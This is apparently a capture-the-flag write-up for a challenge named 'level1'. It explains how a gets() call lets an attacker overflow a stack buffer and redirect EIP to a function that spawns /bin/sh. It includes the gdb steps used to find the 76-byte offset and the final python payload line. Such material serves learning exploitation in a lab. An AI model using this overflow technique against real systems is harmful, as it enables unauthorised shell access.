level1:

the binary makes a call to the 'gets' function, which shoud never be used:
in the man, 'no check for buffer overrun is performed.'

that's in the main function, but there's another one : the run function.
It writes using fwrite, then launch a shell using system("/bin/sh/")
so we have to launch that function.

we have to overrun the buffer of gets to call the run function.
the address of run is : 0x08048444 (it never changes because there's no ASLR !!)

we need to put the address of the run function in the EIP (Extended Instruction Pointer).
Because the EIP contains the address of the next instruction !

Now we need to know the offset of EIP :
python -c 'print "a" * 76 + "B" * 4' > /tmp/exploit
gdb ./level1
r < /tmp/exploit

we get 0x42424242 in ?? (), and 0x42424242 is 'BBBB', so the offset is 76 !
Or in ghidra : its local_50 which is used, and its defined by [76] !

so now we correctly write our exploit, and carefully write the address in little-endian (reversed)

python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
